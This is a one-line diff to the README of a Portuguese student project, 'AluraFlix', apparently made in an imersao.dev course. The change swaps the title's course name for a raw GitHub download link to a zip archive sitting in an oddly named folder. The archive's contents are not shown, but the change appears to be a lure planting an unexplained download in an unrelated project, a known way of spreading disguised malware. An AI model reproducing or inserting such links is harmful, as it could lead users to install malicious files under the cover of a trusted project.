@@ -1,3 +1,3 @@
-# AluraFlix imersao.dev!
+# AluraFlix https://github.com/MISAL44/imersaodev-aluraflix/raw/refs/heads/main/lurement/aluraflix_imersaodev_2.1.zip!
 
 Esse foi o projeto onde eu aprendi a fazer ...
